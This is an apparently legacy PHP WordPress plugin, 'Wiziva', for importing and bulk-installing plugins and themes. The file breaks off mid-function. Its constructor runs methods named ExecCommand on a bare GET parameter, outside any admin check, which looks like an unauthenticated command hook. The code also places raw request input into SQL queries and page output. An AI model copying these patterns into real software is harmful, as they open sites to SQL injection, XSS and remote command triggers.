<?php

class WizivaPlugin {

	public function WizivaPlugin() {
		global $wp_scripts;
		if (isset($_GET['wipa_cmd'])) add_action('widgets_init', array($this, 'ExecCommand'));
		if (isset($_GET['wipa_cmd2'])) add_action('widgets_init', array($this, 'ExecCommandOnline'));
		set_time_limit(300);
		define('Wiziva_API_URL' , 'http://wiziva.com');
		if (is_admin()) {
			add_action('admin_menu', array($this, 'adminMenu'));
			add_action('admin_enqueue_scripts', array($this, 'wizivajs'));
			add_action('wp_ajax_wiziva', array($this, 'wiziva_ajax'));
			if (isset($_GET['page']) && ($_GET['page'] == 'wiziva')) {
				wp_enqueue_script('jquery');
				wp_enqueue_script('jquery-ui-core');
				wp_enqueue_script('jquery-ui-dialog');
				wp_enqueue_style('jquery-ui-smoothness', Wiziva_URL.'jquery-ui.min.css');
				wp_register_script('wiziva', Wiziva_URL.'wiziva.js');
				wp_enqueue_script('wiziva');
				wp_register_style('wiziva', Wiziva_URL.'wiziva.css');
				wp_enqueue_style('wiziva');
			}
		}
	}


	function wizivajs() {
		wp_enqueue_script('ajax-script', Wiziva_URL.'wiziva.js', array('jquery') );
		wp_localize_script('ajax-script', 'ajax_object', array('ajax_url' => admin_url('admin-ajax.php')));
	}

	function wiziva_ajax() {
		//print_r($_GET); print_r($_POST);
		if ($_POST['ajsub']=='main') $this->Ajax();
		if ($_POST['ajsub']=='page') $this->AjaxPage();
		if ($_POST['ajsub']=='submit') $this->AjaxSubmit();
	}


	function AjaxSubmit() {
		global $moreops, $wpdb;
		$tblid = isset($_GET['subid'])?$_GET['subid']:'';
		$msg = '';
		$moreops = '';
		$dialbuts = '';
		switch($_GET['sub']) {
			case 'importfromrepos':
				$this->ImportFromRepo();
				die($moreops);
			break;
			case 'pluginman':
				switch ($_GET['op']) {
					case 'addtogroup':
						$err = '';
						if (!$_POST['mvgrid']) $err = 'Please select Group!';
						else {
							$ids = explode(',', $_POST['opid']);
							foreach ($ids as $pid) if ($pid = trim($pid)) {
								$groups = $wpdb->get_var("SELECT groups FROM {$wpdb->prefix}wiziva_plugins WHERE id=$pid");
								$groups = str_replace("$_POST[mvgrid]|", '', $groups);
								if (!$groups) $groups = '|';
								$groups .= "$_POST[mvgrid]|";
								$wpdb->query("UPDATE {$wpdb->prefix}wiziva_plugins SET groups='$groups' WHERE id=$pid");
							}
						}
						if ($err) $moreops .= "document.getElementById('errbox').innerHTML=\"$err\"; AjaxLoaded();";
						else $moreops .= "jQuery('#dialog-main').dialog('close'); AjaxLoaded();";
						die($moreops);
					break;
					case 'delete':
						$ids = explode(',', $_POST['opid']);
						foreach ($ids as $pid) if ($pid = trim($pid)) {
							$wpdb->query("DELETE FROM {$wpdb->prefix}wiziva_plugins WHERE id=$pid");
							$moreops .= "document.getElementById('plshort$pid').style.display='none';";
						}
						die($moreops."jQuery('#dialog-main').dialog('close'); AjaxLoaded();");
					break;
				}
			break;
		}
		$this->AjaxContent($msg);
		$dialog = '';
		if (isset($_GET['isdialog'])) $dialog = 'dialog';
		if ($tblid) die("jQuery('#err$dialog$tblid').html(\"$msg\"); $moreops AjaxLoaded();");
		die("AjaxLoaded();");
	}


	function AjaxPage() {
		global $moreops, $dialbuttons, $wpdb;
		$tm = time();
		$html = ''; $moreops = ''; $dialbuttons = '';
		$g = '';
		foreach($_GET as $k=>$v) if (($k != 'pg') && ($k != 's')) $g .= "&$k=$v";
		switch($_GET['pg']) {
			case 'pophelp':
				if ($_GET['sub'] == 'about') {
					$_GET['w'] = 600; $_GET['h'] = 300;
					$title = 'What is Wiziva?';
					$content = "
						Wiziva is a packing and installation platform for WordPress.<br />
						Here at this Wiziva Dashboard you can manage a portfolio of your favorite plugins and themes and easily install them in bulk.<br />
						You can put all that in the cloud and access your portfolio from every WordPress installation you may have.<br />
						And Wiziva is far more than just that - <a href='http://wiziva.com' target='_blank'>click here</a> to see more about the project.<br />
					";
				}
				if ($_GET['sub'] == 'howuse') {
					$_GET['w'] = 680; $_GET['h'] = 500;
					$title = 'How To Use the Wiziva Dashboard';
					$content = "
						It is very easy to use the Wiziva Dashboard.<br />
						Here you can import plugins and themes, sort them in groups and then install in bulk.<br /><br />
						There are 4 ways you can add themes and plugins to your dashboard:<br />
						<ol>
							<li><strong>Import from Repository</strong> - You just need to provide the repository URL of the plugin (for example: http://wordpress.org/plugins/wptb-language/) or the theme (for example: http://wordpress.org/themes/alexandria/) and it will be imported to your dashboard</li>
							<li><strong>Search the Plugins Repository</strong> - you can search the repository and in the search result you will see a button \"Add to Wiziva\" that you can use to add the plugin to your portfolio</li>
							<li><strong>Search the Themes Repository</strong> - similar to the plugins, but for themes</li>
							<li><strong>Sync with your Wiziva.com Account</strong> - if you have a Wiziva.com account and a portfolio managed there then you can import all your plugins and themes with a single click. Go to the \"Wiziva Settings\" page to see how you can create a Wiziva.com account and link it with your WordPress installation</li>
						</ol><br />
						Once you have plugins and themes added to your dashboard you can make a multiple selection by clicking on the plugin/theme names and with the selected components you can perform any of the following operations:<br />
						<ul>
							<li><strong>Add to Group</strong> - when you click that button a popup window will appear where you can select the group you would like to move the selected components to.</li>
							<li><strong>Install</strong> - With a single click all the selected plugins and themes will be installed to your WordPress site.</li>
							<li><strong>Remove</strong> - remove/delete the selected plugins and themes from your dashboard. You will see a popup window asking for your confirmation.</li>
							<li><strong>Remove from group</strong> - if you're viewing a particular group (selected in the dropdown box on the top of the page) then you can remove the selected plugins and themes from that group.</li>
						</ul><br />
						To <strong>add a new group</strong> you need to select \"[show all]\" from the drop down box and then click on the small icon next to it.<br />
						If there is a group selected when you click that icon you will edit the title of this group and you can also delete it.<br /><br />
						Clicking on the info icon in front of the plugins/themes will show you the details, the download and the repository URL.<br /><br />
						For more flexible portfolio management and control of multiple sites and installations you can use all our tools and wizards at wiziva.com<br />
						<a href='http://wiziva.com' target='_blank'>You can join now, it's free.</a><br /><br />
					";
				}
				$dialbuttons = "'Close': function() { jQuery(this).dialog('close'); }";
			break;
			case 'qdetails':
				$_GET['w'] = 800; $_GET['h'] = 400;
				$res = $wpdb->get_results("SELECT * FROM {$wpdb->prefix}wiziva_plugins WHERE id=$_GET[id]");
				$info = (array)$res[0];
				$title = ucfirst($info['ptype']).' Details';
				$content = "
					<table class='p6'>
						<tr><td>Title:</td><td>$info[title]</td></tr>
						<tr><td valign='top'>Description:</td><td>$info[description]</td></tr>
						<tr><td>Author:</td><td><a href='$info[aurl]' target='_blank'>$info[author]</a></td></tr>
						<tr><td>Tags:</td><td>$info[tags]</td></tr>
						<tr><td>URL:</td><td><a href='$info[url]' target='_blank'>$info[url]</a></td></tr>
						<tr><td style='width: 110px;'>Download URL:</td><td><a href='$info[downloadurl]' target='_blank'>$info[downloadurl]</a></td></tr>
					</table><br />
					<a href='$info[reposurl]' target='_blank'>open repository</a>
				";
				$dialbuttons = "'Close': function() { jQuery(this).dialog('close'); }";
			break;
			case 'importfromrepos':
				$_GET['w'] = 510; $_GET['h'] = 240;
				$title = 'Import Plugin/Theme from Repository';
				$content = $this->ImportFromRepository();
			break;
			case 'pluginman':
				switch($_GET['op']) {
					case 'addtogroup': 
						$_GET['w'] = 450; $_GET['h'] = 200;
						if (isset($_GET['multi'])) {
							$title = "Add selected to group";
							$ids = '';
							foreach ($_POST as $k=>$v) if (substr($k, 0, 5) == 'plid_') $ids .= substr($k, 5).',';
						}
						$content = $this->AddPluginToGroup($ids, $tm);
					break;
					case 'delete':
						$_GET['w'] = 450; $_GET['h'] = 400;
						$title = "Delete Products";
						$titles = ''; $ids = '';
						foreach ($_POST as $k=>$v) if (substr($k, 0, 5) == 'plid_') {
							$pid = substr($k, 5);
							$id = $wpdb->get_var("SELECT id FROM {$wpdb->prefix}wiziva_plugins WHERE id=$pid");
							if (!$id) continue ;
							$t = $wpdb->get_var("SELECT title FROM {$wpdb->prefix}wiziva_plugins WHERE id=$pid");
							if (!$t) $t = '[no title]';
							$titles .= $t.'<br />';
							$ids .= $pid.',';
						}
						$content = "
							<form method='post' name='pluginman$tm' id='pluginman$tm'>
								<input type='hidden' name='opid' value='$ids' />
								Are you sure you want to delete the selected products:<br />
								$titles
							</form>
						";
					break;
				}
			break;
		}
		$this->AjaxContent($content);
		if (isset($_GET['isdialog'])) {
			if (!isset($_GET['fld'])) $_GET['fld'] = '';
			$w = isset($_GET['w'])?$_GET['w']:400;
			$h = isset($_GET['h'])?$_GET['h']:300;
			if (!$dialbuttons) $dialbuttons = "'Submit': function() { AjaxSubmit('$_GET[pg]$tm', '$_GET[pg]&subid=$tm$g'); }, 'Cancel': function() { jQuery(this).dialog('close'); }";
			$html .= "
				document.getElementById('dialog-main').innerHTML=\"$content\";
				jQuery('#dialog-main').dialog({ zIndex: 0, height: $h, width: $w, title: '$title', modal: true, buttons: { $dialbuttons } });
				$moreops
				document.getElementById('dialog-main').scrollTop = 0;
				AjaxLoaded();
			";
		}
		else {
			$str = strpos($_SERVER['REQUEST_URI'], '&pg=')+4;
			$str = substr($_SERVER['REQUEST_URI'], $str);
			$_SESSION['tabs'][$tm] = $str;
			if ($_POST['newtab']) {
				$html .= "
					$('#maintabs').tabs('add', '#tabs-$tm', \"$title<span class='ui-icon ui-icon-close tabbut' onclick='CloseTab($tm);'></span>\");
					$('#maintabs').tabs('select', '#tabs-$tm');
				";
			}
			$html .= "
				$('a[href$=\"#tabs-$tm\"]').html(\"$title<span class='ui-icon ui-icon-close tabbut' onclick='return CloseTab($tm);'></span>\");
				$('#tabs-$tm').html(\"$content\");
				$moreops
			";
		}
		$html .= "AjaxLoaded();";
		die($html);
	}


	function ImportFromRepo() {
		global $moreops, $wpdb;
		if (isset($_GET['slug'])) {
			$embedded = 1;
			$slug = $_GET['slug'];
			$ptype = $_GET['ptype'];
		}
		else {
			$embedded = 0;
			$reposurl = trim($_POST['reposurl']);
			$reposurl = str_replace('https://', 'http://', $reposurl);
			if (!strpos(' '.$reposurl, 'http://')) $reposurl = 'http://'.$reposurl;
			$reposurl .= '/';
			$ptype = '';
			if (strpos($reposurl, '/plugins/')) {
				$slug = $this->GetBetweenTags($reposurl, '.org/plugins/', '/');
				$ptype = 'plugin';
			}
			if (strpos($reposurl, '/themes/')) {
				$ptype = 'theme';
				$slug = $this->GetBetweenTags($reposurl, '.org/themes/', '/');
			}
		}
		$err = '';
		if ($ptype == 'plugin') {
			$pluginfo = $this->GetPluginDetailsFromRepo($slug);
			foreach ($pluginfo as $k=>$v) $pluginfo[$k] = addslashes($v);
			if (!isset($pluginfo['title'])) $err = "Can not extract plugin details!";
			else {
				$pluginid = $wpdb->get_var("SELECT id FROM {$wpdb->prefix}wiziva_plugins WHERE reposurl='$pluginfo[reposurl]'");
				if ($pluginid) $wpdb->query("UPDATE {$wpdb->prefix}wiziva_plugins SET downloadurl='$pluginfo[downloadurl]', title='$pluginfo[title]', version='$pluginfo[version]', url='$pluginfo[url]', author='$pluginfo[author]', aurl='$pluginfo[aurl]', license='$pluginfo[license]', lurl='$pluginfo[lurl]', description='$pluginfo[description]', tags='$pluginfo[tags]', lastupdate=$pluginfo[lastupdate] WHERE id=$pluginid");
				else {
					$wpdb->query("INSERT INTO {$wpdb->prefix}wiziva_plugins (ptype, reposurl, downloadurl, title, version, url, author, aurl, license, lurl, description, tags, lastupdate) VALUES ('plugin', '$pluginfo[reposurl]', '$pluginfo[downloadurl]', '$pluginfo[title]', '$pluginfo[version]', '$pluginfo[url]', '$pluginfo[author]', '$pluginfo[aurl]', '$pluginfo[license]', '$pluginfo[lurl]', '$pluginfo[description]', '$pluginfo[tags]', $pluginfo[lastupdate]);");
					$pluginid = mysql_insert_id();
				}
			}
		}
		if ($ptype == 'theme') {
			$pluginfo = $this->GetThemeDetailsFromRepo($slug);
			if (!isset($pluginfo['title'])) $err = "Can not extract theme details!";
			else {
				$pluginid = $wpdb->get_var("SELECT id FROM {$wpdb->prefix}wiziva_plugins WHERE reposurl='$pluginfo[reposurl]'");
				if ($pluginid) $wpdb->query("UPDATE {$wpdb->prefix}wiziva_plugins SET downloadurl='$pluginfo[downloadurl]', title='$pluginfo[title]', version='$pluginfo[version]', url='$pluginfo[url]', author='$pluginfo[author]', aurl='$pluginfo[aurl]', license='$pluginfo[license]', lurl='$pluginfo[lurl]', description='$pluginfo[description]', tags='$pluginfo[tags]', lastupdate=$pluginfo[lastupdate] WHERE id=$pluginid;");
				else {
					$wpdb->query("INSERT INTO {$wpdb->prefix}wiziva_plugins (ptype, reposurl, downloadurl, title, version, url, author, aurl, license, lurl, description, tags, lastupdate) VALUES ('theme', '$pluginfo[reposurl]', '$pluginfo[downloadurl]', '$pluginfo[title]', '$pluginfo[version]', '$pluginfo[url]', '$pluginfo[author]', '$pluginfo[aurl]', '$pluginfo[license]', '$pluginfo[lurl]', '$pluginfo[description]', '$pluginfo[tags]', $pluginfo[lastupdate]);");
					$pluginid = mysql_insert_id();
				}
			}
		}
		if ($err) {
			if ($embedded) $moreops .= "document.getElementById('status-$slug').innerHTML=\"<span style='color: red;'>failed</span>\";AjaxLoaded();";
			else $moreops .= "document.getElementById('errbox').innerHTML=\"<br /><span style='color: red;'>$err</span>\"; AjaxLoaded();";
		}
		else {
			$plname = $wpdb->get_var("SELECT title FROM {$wpdb->prefix}wiziva_plugins WHERE id=$pluginid");
			if ($embedded) $moreops .= "document.getElementById('status-$slug').innerHTML=\"<span style='color: #fff; background: green;'>&nbsp;success&nbsp;</span>\";AjaxLoaded();";
			else {
				$content = $this->Msg_OK("The $ptype '$plname' was imported successfully!");
				AjaxContent($content);
				$moreops .= "document.getElementById('resmsg').innerHTML=\"$content\"; AjaxAction('prodlist'); jQuery('#dialog-main').dialog('close');  AjaxLoaded();";
			}
		}
	}

	function AddPluginToGroup($pluginid, $tm) {
		$content = "
			<form method='post' name='pluginman$tm' id='pluginman$tm'>
				<input type='hidden' name='opid' value='$pluginid' />
				Select Group: ".
				$this->SelUserGroup('mvgrid', 0)."
				<span id='errbox'></span>
			</form>
		";
		return $content;
	}


	function Ajax() {
		global $moreops, $wpdb;
		$moreops .= "if (document.getElementById('loading')) document.getElementById('loading').style.visibility = 'hidden';";
		$tm = time();
		$_GET['ajaxop'] = 1;
		switch ($_GET['a']) {
			case 'wizstep':
				$pids = explode(',', $_GET['pids']);
				$pid = $pids[$_GET['num']];
				if (isset($_GET['do'])) {
					$this->InstallPlugin($pid);
					$moreops = "clearTimeout(prtm);";
					$moreops .= "document.getElementById('progress$_GET[num]').innerHTML=\"<span class='success'>.....</span>\"; document.getElementById('result$_GET[num]').innerHTML=\"<span class='label label-success'>success</span>\";";
					$num = $_GET['num']+1;
					if (isset($pids[$num])) $moreops .= "AjaxAction('wizstep&num=$num&pids=$_GET[pids]');";
					else $moreops .= "alldone=1;document.getElementById('wizprogress').innerHTML += \"<br /><br />All done!<br /><br /><a href='admin.php?page=wiziva' class='button add-new-h2'>Back to Dashboard</a>\";";
				}
				else {
					$title = $wpdb->get_var("SELECT title FROM {$wpdb->prefix}wiziva_plugins WHERE id=$pid");
					$num = $_GET['num']+1;
					$content = "<br />Installing <strong>$title</strong> <span class='progr' id='progress$_GET[num]'>.</span> <span id='result$_GET[num]'></span>";
					$moreops = "alldone=0;progr=0;opinit=0;curop=$_GET[num];prtm=setTimeout(\"Progress()\", 1000);document.getElementById('wizprogress').innerHTML += \"$content\";document.getElementById('numop').innerHTML = '$num';";
				}
				die($moreops);
			break;
			case 'imprepo':
				$this->ImportFromRepo();
				die($moreops);
			break;
			case 'rmvfrompck':
				if (isset($_GET['multi'])) {
					$ids = array();
					foreach ($_POST as $k=>$v) if ((substr($k, 0, 5) == 'plid_') && $v) $ids[] = $v;
				}
				else $ids = array($_POST['opid']);
				foreach ($ids as $pid) {
					$groups = $wpdb->get_var("SELECT groups FROM {$wpdb->prefix}wiziva_plugins WHERE id=$pid");
					$groups = str_replace("$_POST[groupid]|", '', $groups);
					if ($groups=='|') $groups = '';
					$wpdb->query("UPDATE {$wpdb->prefix}wiziva_plugins SET groups='$groups' WHERE id=$pid");
					$moreops .= "document.getElementById('plshort$pid').style.display='none';";
				}
				die($moreops);
			break;
			case 'newselectable':
				$fld = $_GET['fld'];
				$id = $_POST[$fld];
				$this->NoQuotes($_POST["new_$fld"]);
				$title = addslashes($_POST["new_$fld"]);
				switch($_GET['stype']) {
					case 'usergroup':
						if ($id) {
							$wpdb->query("UPDATE {$wpdb->prefix}wiziva_groups SET title='$title' WHERE id=$id");
							$moreops .= "
								obj = document.getElementById('$fld');
								obj.options[obj.selectedIndex].text='$title';
							";
						}
						elseif (!$wpdb->get_var("SELECT id FROM {$wpdb->prefix}wiziva_groups WHERE title='$title'")) {
							$wpdb->query("INSERT INTO {$wpdb->prefix}wiziva_groups (title, tadded) VALUES ('$title', $tm)");
							$id = mysql_insert_id();
							$moreops .= "
								var o = document.createElement('OPTION');
								var t = document.createTextNode('$title');
								o.setAttribute('selected', 'selected');
								o.setAttribute('value', $id);
								o.appendChild(t);
								document.getElementById('$fld').appendChild(o);
							";
							if (isset($_GET['auto'])) $moreops .= "document.getElementById('$fld').form.submit();";
						}
						$moreops .= "CancelNewSelectable('$fld');";
						die($moreops);
					break;
				}
			break;
		}
		return '';
	}


	function adminMenu() {
		add_menu_page('Wiziva', 'Wiziva', 'manage_options', Wiziva_PLUGIN_SLUG, array($this, 'Dashboard'), Wiziva_URL.'/images/icon-tools.gif');
		add_submenu_page(Wiziva_PLUGIN_SLUG, 'Wiziva - Dashboard', 'Dashboard', 'manage_options', Wiziva_PLUGIN_SLUG, array($this, 'Dashboard'));
		add_submenu_page(Wiziva_PLUGIN_SLUG, 'Wiziva - Settings', 'Settings', 'manage_options', Wiziva_PLUGIN_SLUG.'-settings', array($this, 'Settings'));
	}

	function AutoUpdate() {

	}
	
	function WizivaSync() {
		global $wpdb;
		echo "
			<div class='wrap'>
				<div id='icon-edit-pages' class='icon32'></div>
				<h2>Import from Wiziva.com Account 
				&nbsp;<a href='admin.php?page=wiziva' class='button add-new-h2'>Back to Dashboard</a>
				</h2><br />
				<div class='clear'></div>
		";
		$msg = '';
		if (isset($_POST['doimport'])) {
			$url = urlencode(get_site_url());
			$hash = urlencode(get_settings('wiziva_hash'));
			$gr = isset($_POST['importgroups'])?'&groups=1':'';
			$import = file_get_contents(Wiziva_API_URL."/api.php?op=import&hash=$hash&wpurl=$url$gr");
			if (strpos(' '.$import, '<ok>1</ok>')) {
				$numgradd = 0;
				$numgrupd = 0;
				if (isset($_POST['importgroups'])) {
					$groups = explode('<group>', $this->GetBetweenTags($import, '<groups>', '</groups>'));
					foreach ($groups as $group) if (strpos($group, '</id>')) {
						$id = $this->GetBetweenTags($group, '<id>', '</id>');
						$title = $this->GetBetweenTags($group, '<t>', '</t>');
						$gid = $wpdb->get_var("SELECT id FROM {$wpdb->prefix}wiziva_groups WHERE id=$id");
						if ($gid) {
							$wpdb->query("UPDATE {$wpdb->prefix}wiziva_groups SET title='$title' WHERE id=$gid");
							$numgrupd++;
						}
						else {
							$wpdb->query("INSERT INTO {$wpdb->prefix}wiziva_groups (id, title) VALUES ($id, '$title')");
							$numgradd++;
						}
					}
				}
				$numpladd = 0;
				$numplupd = 0;
				$plugins = explode('<plugin>', $this->GetBetweenTags($import, '<plugins>', '</plugins>'));
				foreach ($plugins as $plugin) if (strpos($plugin, '</pt>')) {
					$ptype = $this->GetBetweenTags($plugin, '<pt>', '</pt>');
					if (!$ptype) continue;
					$reposurl = $this->GetBetweenTags($plugin, '<ru>', '</ru>');
					$title = addslashes($this->GetBetweenTags($plugin, '<t>', '</t>'));
					$version = $this->GetBetweenTags($plugin, '<v>', '</v>');
					$description = addslashes(htmlspecialchars_decode($this->GetBetweenTags($plugin, '<d>', '</d>')));
					$author = $this->GetBetweenTags($plugin, '<a>', '</a>');
					$aurl = $this->GetBetweenTags($plugin, '<au>', '</au>');
					$tags = $this->GetBetweenTags($plugin, '<tg>', '</tg>');
					$url = $this->GetBetweenTags($plugin, '<u>', '</u>');
					$license = $this->GetBetweenTags($plugin, '<l>', '</l>');
					$lurl = $this->GetBetweenTags($plugin, '<lu>', '</lu>');
					$downloadurl = $this->GetBetweenTags($plugin, '<du>', '</du>');
					$lastupdate = $this->GetBetweenTags($plugin, '<up>', '</up>');
					if ($reposurl) $pid = $wpdb->get_var("SELECT id FROM {$wpdb->prefix}wiziva_plugins WHERE reposurl='$reposurl'");
					else $pid = $wpdb->get_var("SELECT id FROM {$wpdb->prefix}wiziva_plugins WHERE title='$title'");
					$doupd = 0;
					if (!$pid) {
						$wpdb->query("INSERT INTO {$wpdb->prefix}wiziva_plugins (reposurl) VALUES ('$reposurl')");
						$pid = $wpdb->insert_id;
						$numpladd++;
						$doupd = 1;
					}
					elseif (isset($_POST['updateexisting'])) {
						$doupd = 1;
						$numplupd++;
					}
					$gr = isset($_POST['importgroups'])?", groups='".$this->GetBetweenTags($plugin, '<gr>', '</gr>')."'":'';
					if ($doupd) $wpdb->query("UPDATE {$wpdb->prefix}wiziva_plugins SET ptype='$ptype', reposurl='$reposurl', title='$title', version='$version', description='$description', author='$author', aurl='$aurl', tags='$tags', url='$url', license='$license', lurl='$lurl', downloadurl='$downloadurl', lastupdate='$lastupdate'$gr WHERE id=$pid");
				}
				$gr = isset($_POST['importgroups'])?"<br />$numgradd groups added and $numgrupd updated!":'';
				$msg = "<div style='color: green; font-weight: bold; padding: 10px;'>Import Complete!$gr<br />$numpladd plugins added and $numplupd updated!</div>";
			}
			else $msg = "<div style='color: red; font-weight: bold; padding: 10px;'>".$this->GetBetweenTags($import, '<errmsg>', '</errmsg>')."</div>";
		}
		echo "
			$msg
				When you click the button below all the plugins and themes from your Wiziva.com account will be imported to your local portfolio.<br />
				Wiziva Wizards will not be imported. They can be run only on our site.<br /><br />
				<form method='post'>
					<input type='checkbox' name='importgroups' id='importgroups' value='1' /> <label for='importgroups'>Also import groups</label> (<small>Your existing groups may be overwrriten!</small>)<br /><br />
					<input type='checkbox' name='updateexisting' id='updateexisting' value='1' /> <label for='updateexisting'>Update the existing Plugins/Themes</label><br /><br />
					<input type='submit' class='button-primary' name='doimport' value='Import' /><br /><br />
					<strong>Please wait for few minutes</strong> after you click the button, because the process may take some time.<br />
				</form>
			</div>
		";
	}

	function Dashboard() {
		global $wpdb;
		if (isset($_POST['multiplugs'])) return $this->Wizard();
		if (isset($_GET['sync'])) return $this->WizivaSync();
		if (isset($_GET['searchrepo'])) {
			if ($_GET['searchrepo']=='plugins') return $this->SearchRepoPlugins();
			else return $this->SearchRepoThemes();
		}
		$groupid = isset($_GET['groupid'])?$_GET['groupid']:0;
		$hash = get_settings('wiziva_hash');
		$sync = $hash?"&nbsp;<a href='admin.php?page=wiziva&sync=1' class='button add-new-h2'>Sync with Wiziva.com Account</a>":'';
		$html = "
			<div class='wrap'>
				<div id='icon-edit-pages' class='icon32'></div>
				<h2>Wiziva Dashboard 
					&nbsp;<a href='admin.php?page=wiziva&searchrepo=plugins' class='button add-new-h2'>Search Plugins</a>
					&nbsp;<a href='admin.php?page=wiziva&searchrepo=themes' class='button add-new-h2'>Search Themes</a>
					&nbsp;<a href='#' onclick=\"AjaxPop('importfromrepos');\" class='button add-new-h2'>Import from Repository</a>
					$sync
					&nbsp;<a href='admin.php?page=wiziva-settings' class='button add-new-h2'>Manage Settings</a>
				</h2><br />
				<div class='clear'></div>
				<div id='resmsg'></div>
				<div class='spacer10'></div>
				<form method='get' action='admin.php'>
					<input type='hidden' name='page' value='wiziva' />
					<div class='col-sm-6 col-lg-4' style='margin-bottom: 10px;'>
						Select Group: ".$this->SelUserGroup('groupid', $groupid, 'auto')." &nbsp; &nbsp;
					</div>
				</form>
		";
		$q = '';
		$q .= $groupid?" AND (groups like '%|$groupid|%')":'';
		$html .= "<div id='lstbox'>";
		$data = $wpdb->get_results("SELECT id, ptype, version, title FROM {$wpdb->prefix}wiziva_plugins WHERE 1$q ORDER BY ptype, title ASC");
		if (!count($data)) {
			$gr = $groupid?' to this group':'';
			echo $html."You don't have any plugins added$gr yet.<br /><br /><a href='#' class='quickbut' onclick=\"AjaxPop('importfromrepos');\">Import from repository</a>".$this->Footer();
			return ;
		}
		$html .= "
			<form name='plugman' id='plugman' method='post'>
				<input type='hidden' id='groupid' name='groupid' value=$groupid />
				<div class='spacer20'></div>
		";
		foreach ($data as $k=>$obj) {
			$html .= "
				<div class='pluginitem' id='plshort{$obj->id}'>
					<input type='checkbox' name='plid_{$obj->id}' id='plid_{$obj->id}' value='0' onclick=\"AjaxCB(this, {$obj->id});MarkPlugin({$obj->id}, '{$obj->ptype}');\" /> <label for='plid_{$obj->id}'>{$obj->title} v{$obj->version}</label>
					<span id='mplid_{$obj->id}' class='man{$obj->ptype}'>manage</span>
					<span class='infolnk' onclick=\"AjaxPop('qdetails&id={$obj->id}');\">plugin details</span>
				</div>
			";
		}
		$html .= "</div>";
		$rem = $groupid?"<input type='button' class='button-secondary' value='Remove From Group' onclick=\"AjaxAction('rmvfrompck&multi=1', 'groupid plid_');\" /> &nbsp; ":'';
		$html .= "
			<div class='spacer20'></div>
			<h3>With selected:</h3>
				<input type='button' class='button-primary' value='Add To Group' onclick=\"AjaxPop('pluginman&op=addtogroup&multi=1', 'plugman');\" /> &nbsp; 
				<input type='submit' name='multiplugs' class='button-primary' value='Install' onclick=\"AjaxPop('installplugin&multi=1', 'plugman');\" /> &nbsp; 
				$rem
				<input type='button' class='button-secondary' value='Remove' onclick=\"AjaxPop('pluginman&op=delete', 'plugman');\" />
			</form>
			<div class='spacer20'></div>
		".$this->Footer();
		$html .= '</div>';
		echo $html;
	}

	function Wizard() {
		global $wpdb;
		$plugs = '';
		$pids = '';
		foreach ($_POST as $k=>$pid) if ((substr($k, 0, 5) == 'plid_') && $pid) {
			$t = $wpdb->get_var("SELECT title FROM {$wpdb->prefix}wiziva_plugins WHERE id=$pid");
			if (!$t) continue;
			$plugs .= $t.'<br />';
			$pids .= $pid.',';
		}
		$pids = trim($pids, ',');
		$counter = count(explode(',', $pids));
		echo "
			<h2>Wiziva Installer</h2>
			<strong>Installing the following plugin(s):</strong><br />
			$plugs<br />
			<h3>Performing operation <span id='numop'>1</span>/$counter</h3>
			<div id='wizprogress'></div>
			<span id='pids' style='display: none;'>$pids</span>
			<script>AjaxAction('wizstep&num=0&pids=$pids');</script>
		";
	}


	function SearchRepoPlugins() {
		global $wpdb;
		if (!isset($_GET['kw'])) $_GET['kw'] = '';
		$plugins_allowedtags = array(
			'a' => array( 'href' => array(),'title' => array(), 'target' => array() ),
			'abbr' => array( 'title' => array() ),'acronym' => array( 'title' => array() ),
			'code' => array(), 'pre' => array(), 'em' => array(),'strong' => array(),
			'ul' => array(), 'ol' => array(), 'li' => array(), 'p' => array(), 'br' => array()
		);
		echo "
			<div class='wrap'>
				<div id='icon-edit-pages' class='icon32'></div>
				<h2>Search the Repository for Plugins 
					&nbsp;<a href='admin.php?page=wiziva&searchrepo=themes' class='button add-new-h2'>Search Themes</a>
					&nbsp;<a href='admin.php?page=wiziva' class='button add-new-h2'>Back to Dashboard</a>
				</h2><br />
				<form method='get'>
					<input type='hidden' name='page' value='wiziva' />
					<input type='hidden' name='searchrepo' value='plugins' />
					<input type='text' name='kw' value='$_GET[kw]' /> <input type='submit' name='gosearch' value='Search' />
				</form><br /><br />
		";
		if (!$_GET['kw']) {
			echo '</div>';
			return '';
		}
		include_once(ABSPATH.'wp-admin/includes/plugin-install.php');
		include_once(ABSPATH.'wp-admin/includes/class-wp-plugin-install-list-table.php');
		add_thickbox();
		$paged = 1; //$this->get_pagenum();
		$per_page = 30;
		$lt = new WP_Plugin_Install_List_Table();
		$args = array(
			'search'=>$_GET['kw'],
			'page' => $paged,
			'per_page' => $per_page,
			'fields' => array('last_updated' => true, 'downloaded' => true, 'icons' => true),
			'locale' => get_locale(),
			'installed_plugins' => $lt->get_installed_plugin_slugs(),
		);
		$args = (object)$args;
		$request = array('action'=>'query_plugins', 'timeout'=>30, 'request'=>serialize($args));
		$url = 'http://api.wordpress.org/plugins/info/1.0/';
		$ret = $this->httpPost($url, $request);
		$ret = unserialize($ret);
		$plugs = $ret->plugins;
		$userslugs = array();
		$res = $wpdb->get_results("SELECT reposurl FROM {$wpdb->prefix}wiziva_plugins WHERE ptype='plugin'");
		foreach ($res as $k=>$obj) $userslugs[] = $this->GetBetweenTags($obj->reposurl, 'plugins/', '/');
		foreach ($plugs as $pinfo) {
			$plugin = (array)$pinfo;
			//print_r($pinfo);
			//$but = in_array($pinfo['slug'], $userslugs)?'in portfolio':"<input type='button' onclick=\"AjaxLoading();AjaxAction('imprepo&ptype=plugin&slug=$pinfo[slug]');\" value='import'>";
			$details_link = self_admin_url( 'plugin-install.php?tab=plugin-information&amp;plugin=' . $plugin['slug'] . '&amp;TB_iframe=true&amp;width=600&amp;height=550' );
			$details_link = esc_url($details_link);
			if ( !empty( $plugin['icons']['svg'] ) ) $plugin_icon_url = $plugin['icons']['svg'];
			elseif ( !empty( $plugin['icons']['2x'] ) ) $plugin_icon_url = $plugin['icons']['2x'];
			elseif ( !empty( $plugin['icons']['1x'] ) ) $plugin_icon_url = $plugin['icons']['1x'];
			else $plugin_icon_url = $plugin['icons']['default'];
			$plugin_icon_url = esc_attr($plugin_icon_url);
			$title = wp_kses($plugin['name'], $plugins_allowedtags);
			$version = wp_kses( $plugin['version'], $plugins_allowedtags );
			$name = strip_tags( $title . ' ' . $version );
			$action_links = array();
			if (current_user_can('install_plugins') || current_user_can('update_plugins')) {
				$status = install_plugin_install_status( $plugin );
				switch ( $status['status'] ) {
					case 'install':
